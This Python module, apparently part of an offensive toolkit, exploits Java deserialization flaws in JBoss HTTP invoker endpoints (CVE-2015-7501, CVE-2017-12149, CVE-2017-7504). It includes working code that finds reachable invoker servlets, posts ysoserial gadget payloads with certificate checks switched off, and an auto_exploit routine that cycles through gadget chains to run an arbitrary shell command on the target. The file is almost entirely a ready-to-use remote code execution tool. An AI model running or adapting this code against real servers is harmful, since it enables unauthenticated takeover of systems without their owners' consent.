"""JBoss HTTP Invoker exploitation.

Target CVEs
-----------
* **CVE-2015-7501** — JBoss 4.x/5.x/6.x ``/invoker/JMXInvokerServlet``.
  An unauthenticated HTTP POST with a serialised Java object triggers
  remote code execution via the ``CommonsCollections`` gadget chain.
  No authentication required; the endpoint deserialises the POST body
  directly without any type checking.

* **CVE-2017-12149** — JBoss AS 6.x ``/invoker/readonly``.
  Same attack surface, different path.  The ``readonly`` invoker was
  intended for read-only JMX operations but still deserialises the body.

* **CVE-2017-7504** — JBoss 4.x ``/invoker/EJBInvokerServlet``.
  Another HTTP invoker endpoint that deserialises the POST body.

All three are exploited the same way: POST a ysoserial payload (serialised
``ObjectOutputStream``) to the invoker URL.  The server deserialises the
body and the gadget chain executes.
"""

from __future__ import annotations

import ssl
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any

_HTTP_TIMEOUT = 8.0

# Preferred gadget probe order — most commonly deployed libraries first.
_PROBE_PRIORITY: tuple[str, ...] = (
    "CommonsCollections6",
    "CommonsCollections5",
    "CommonsCollections7",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsBeanutils1",
    "Spring1",
    "Spring2",
    "Groovy1",
    "ROME",
    "BeanShell1",
    "Clojure",
    "Jython1",
    "MozillaRhino1",
    "MozillaRhino2",
)

# These gadgets don't run OS commands — skip them in auto mode.
_NON_EXEC_GADGETS: frozenset[str] = frozenset({"URLDNS", "JRMPClient"})

# Default invoker paths to try (in priority order)
_DEFAULT_PATHS = [
    "/invoker/JMXInvokerServlet",    # CVE-2015-7501
    "/invoker/readonly",              # CVE-2017-12149
    "/invoker/EJBInvokerServlet",     # CVE-2017-7504
    "/web-console/Invoker",
]


@dataclass
class InvokerExploitResult:
    """Result of an HTTP invoker exploit attempt."""
    sent: bool = False
    likely_success: bool = False
    http_status: int | None = None
    endpoint: str = ""
    response_text: str | None = None
    error: str | None = None
    gadget_used: str | None = None   # set by auto_exploit()

    def to_dict(self) -> dict[str, Any]:
        return {
            "sent": self.sent,
            "likely_success": self.likely_success,
            "http_status": self.http_status,
            "endpoint": self.endpoint,
            "response_text": self.response_text,
            "error": self.error,
            "gadget_used": self.gadget_used,
        }


class HttpInvoker:
    """Deliver serialised Java payloads via JBoss HTTP invoker endpoints.

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    def __init__(self, timeout: float = 5.0, scheme: str = "http"):
        self.timeout = timeout
        self.scheme = scheme

    def probe_endpoints(self, host: str, port: int) -> list[str]:
        """Return a list of reachable HTTP invoker servlet paths.

        A path is considered reachable if the server responds with any
        HTTP status code (even 4xx/5xx), because an HTTP error means the
        servlet exists but the request format was unexpected.
        """
        reachable: list[str] = []
        base_url = f"{self.scheme}://{host}:{port}"
        ctx = None
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        for path in _DEFAULT_PATHS:
            url = base_url + path
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Mozilla/5.0"},
                )
                urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT, context=ctx)
                reachable.append(path)
            except urllib.error.HTTPError as exc:
                if exc.code not in (404, 401, 403):
                    reachable.append(path)
            except (urllib.error.URLError, OSError):
                pass

        return reachable

    def exploit(
        self,
        host: str,
        port: int,
        payload_bytes: bytes,
        path: str | None = None,
    ) -> InvokerExploitResult:
        """POST *payload_bytes* to the invoker endpoint.

        Parameters
        ----------
        host, port:
            Target JBoss instance.
        payload_bytes:
            A raw Java serialised object (``ObjectOutputStream`` stream),
            typically produced by ysoserial.
        path:
            Invoker path to use.  If ``None``, try all default paths in
            order and return the first result that gets a response.
        """
        paths_to_try = [path] if path else _DEFAULT_PATHS

        for p in paths_to_try:
            result = self._post_payload(host, port, p, payload_bytes)
            if result.sent:
                return result

        result = InvokerExploitResult()
        result.error = f"No invoker endpoint responded on {host}:{port}"
        return result

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _post_payload(
        self,
        host: str,
        port: int,
        path: str,
        payload_bytes: bytes,
    ) -> InvokerExploitResult:
        result = InvokerExploitResult()
        url = f"{self.scheme}://{host}:{port}{path}"
        result.endpoint = url

        ctx = None
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(
                url,
                data=payload_bytes,
                method="POST",
                headers={
                    "Content-Type": "application/x-java-serialized-object",
                    "Content-Length": str(len(payload_bytes)),
                    "User-Agent": "Mozilla/5.0",
                },
            )
            resp = urllib.request.urlopen(req, timeout=_HTTP_TIMEOUT, context=ctx)
            result.sent = True
            result.http_status = resp.status
            body = resp.read(512)
            result.response_text = body.decode("utf-8", errors="replace")
            # A 2xx status after sending a serialised payload = very likely executed
            result.likely_success = 200 <= resp.status < 300

        except urllib.error.HTTPError as exc:
            # HTTP 500 is expected when the command executes but the return is invalid Java
            # HTTP 400 / 415 means the endpoint exists but rejected the content type
            result.sent = True
            result.http_status = exc.code
            result.likely_success = exc.code == 500
            try:
                body = exc.read(256)
                result.response_text = body.decode("utf-8", errors="replace")
            except Exception:
                pass

        except urllib.error.URLError as exc:
            result.error = str(exc.reason)

        except OSError as exc:
            result.error = str(exc)

        return result

    def auto_exploit(
        self,
        host: str,
        port: int,
        command: str,
        path: str | None = None,
        jar_path: str | None = None,
    ) -> tuple[str | None, InvokerExploitResult]:
        """Try gadgets in priority order and stop on first likely_success.

        Parameters
        ----------
        host, port:
            Target JBoss instance.
        command:
            Shell command to execute on the target.
        path:
            Invoker path to target (auto-detected if ``None``).
        jar_path:
            Path to ysoserial JAR (uses YSOSERIAL_PATH env var if ``None``).

        Returns
        -------
        tuple[str | None, InvokerExploitResult]
            ``(gadget_used, result)`` — ``gadget_used`` is ``None`` if no
            gadget succeeded.
        """
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar_path)
        try:
            available = set(wrapper.list_gadgets())
        except Exception:  # noqa: BLE001
            empty = InvokerExploitResult(error="ysoserial unavailable")
            return None, empty

        to_try: list[str] = [
            g for g in _PROBE_PRIORITY if g in available and g not in _NON_EXEC_GADGETS
        ]
        to_try += sorted(available - set(to_try) - _NON_EXEC_GADGETS)

        for gadget in to_try:
            try:
                payload = wrapper.generate(gadget, command)
            except Exception:  # noqa: BLE001
                continue
            result = self.exploit(host, port, payload, path=path)
            if result.likely_success:
                result.gadget_used = gadget
                return gadget, result

        last = InvokerExploitResult(error="No gadget produced a likely_success response")
        return None, last

    def spray(
        self,
        host: str,
        port: int,
        gadgets_payloads: dict[str, bytes],
        path: str | None = None,
    ) -> dict[str, InvokerExploitResult]:
        """Try multiple gadget payloads and return results keyed by gadget name.

        Parameters
        ----------
        host, port:
            Target JBoss endpoint.
        gadgets_payloads:
            Mapping of ``{gadget_name: payload_bytes}``.
        path:
            Invoker path to target (auto-detected if ``None``).
        """
        results: dict[str, InvokerExploitResult] = {}
        for name, payload in gadgets_payloads.items():
            results[name] = self.exploit(host, port, payload, path=path)
        return results
